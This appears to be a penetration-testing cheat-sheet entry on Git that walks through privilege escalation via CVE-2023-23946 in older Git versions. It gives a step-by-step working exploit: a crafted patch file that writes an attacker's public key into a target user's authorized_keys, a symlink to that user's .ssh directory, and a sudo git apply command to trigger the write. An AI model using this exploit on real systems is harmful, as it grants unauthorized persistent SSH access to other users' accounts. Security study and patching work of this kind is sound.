Git

Git is a free and open source distributed version control system designed to handle everything from small to very large projects with speed and efficiency.

Always recomended to check the version of the application with git --version in order to identify related vulnerabilities

Exploitation

    Privilege escalation - CVE-2023-23946

      In case we already have a shell inside the machine and found a git version prior to 2.39.2, 2.38.4, 2.37.6, 2.36.5, 2.35.7, 2.34.7, 2.33.7, 2.32.6, 2.31.7, and 2.30.8

      We could be able to perform file write with privileges. To do so check the repo. Create a .patch file and place the following

      diff --git a/symlink b/newsymlink
rename from symlink
rename to newsymlink
--
diff --git /dev/null b/newsymlink/authorized_keys
new file mode 100644
index 0000000..e47f4ea
--- /dev/null
+++ b/newsymlink/authorized_keys
@@ -0,0 +1 @@
+YOUR_PUBLIC_KEY_HERE

      Move the file to /tmp/ to make it accessible for everyone and change it's permissions

      chmod 644 /tmp/exploit.patch

      Create the sym link to point to the folder you would like to modify

      ln -s /home/sbrown/.ssh/ symlink

      Finally execute the apply and wait which will write your public key into the authorized keys of your target user

      sudo -u sbrown /usr/bin/git apply -v exploit.patch
